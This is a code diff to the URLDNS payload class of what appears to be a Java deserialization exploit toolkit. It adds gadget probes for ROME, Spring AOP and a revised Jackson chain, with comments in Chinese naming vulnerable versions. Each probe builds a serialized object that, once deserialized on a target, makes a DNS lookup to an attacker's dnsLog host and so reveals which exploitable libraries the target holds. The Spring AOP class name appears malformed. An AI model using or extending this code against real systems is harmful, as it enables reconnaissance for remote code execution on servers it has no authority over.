@@ -39,7 +39,7 @@ import java.util.List;
 public class URLDNS implements ObjectPayload<Object> {
     public static String[] defaultClass = new String[]{
             "CommonsCollections13567", "CommonsCollections24", "CommonsBeanutils2", "C3P0", "AspectJWeaver", "bsh",
-            "Groovy", "Becl", "Jdk7u21", "JRE8u20", "winlinux", "jackson2100"};
+            "Groovy", "Becl", "Jdk7u21", "JRE8u20", "winlinux", "jackson2100","ROME","SpringAOP"};
 
     public static List<Object> list = new LinkedList();
 
@@ -179,12 +179,25 @@ public class URLDNS implements ObjectPayload<Object> {
                 list.add(windows);
                 break;
             case "jackson2100":
-                Object jackson2100 = getURLDNSGadget("jackson2100." + dnsLog, "com.fasterxml.jackson.databind.node.POJONode");
+                //jackson-databind>=2.10.0存在一个链
+                Object jackson2100 = getURLDNSGadget("jackson2100." + dnsLog, "com.fasterxml.jackson.databind.node.NodeSerialization");
                 list.add(jackson2100);
                 break;
             case "fastjson":
                 Object fastjson = getURLDNSGadget("fastjson." + dnsLog, "com.alibaba.fastjson.JSONArray");
                 list.add(fastjson);
+                break;
+            case "ROME":
+                //rome <= 1.11.1
+                Object rome1000 = getURLDNSGadget("rome1000."+dnsLog, "com.sun.syndication.feed.impl.ToStringBean");
+                Object rome1111 = getURLDNSGadget("rome1111."+dnsLog, "com.rometools.rome.feed.impl.ObjectBean");
+                list.add(rome1000);
+                list.add(rome1111);
+                break;
+            case "SpringAOP":
+                //fastjon/jackson两个链的变种都需要springAOP
+                Object springAOP = getURLDNSGadget("SpringAOP."+dnsLog, "org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource");
+                list.add(springAOP);
                 break;
             case "all":
                 for (int i = 0; i < defaultClass.length; i++) {
